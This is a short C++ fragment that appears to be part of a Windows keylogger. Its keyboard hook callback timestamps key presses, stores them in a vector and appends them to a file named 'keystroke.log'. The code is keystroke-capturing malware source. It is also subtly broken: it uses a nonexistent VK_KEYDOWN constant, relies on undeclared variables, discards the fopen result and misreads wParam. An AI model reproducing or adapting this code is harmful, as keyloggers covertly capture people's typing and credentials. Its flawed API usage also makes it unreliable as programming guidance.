std::vector<int> keystrokesVector;
char logFileName[] = "keystroke.log";

LRESULT CALLBACK keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        if (GetAsyncKeyState(VK_KEYDOWN) != 0) {
            std::cout << "Key pressed: " << static_cast<unsigned char>(wParam) << std::endl;
            time_t now;
            time(&now);
            snprintf(keystrokes.time, sizeof(keystrokes.time), "[%s] ", ctime(&now));
            keystrokes.key = static_cast<int>(wParam);
            keystrokesVector.push_back(keystrokes.key);

            if (fopen(logFileName, "a") != NULL) {
                fprintf(logFile, "[%s] Key: %d\n", keystrokes.time, keystrokes.key);
                fclose(logFile);
            }
        }
    }
    return 0;
}

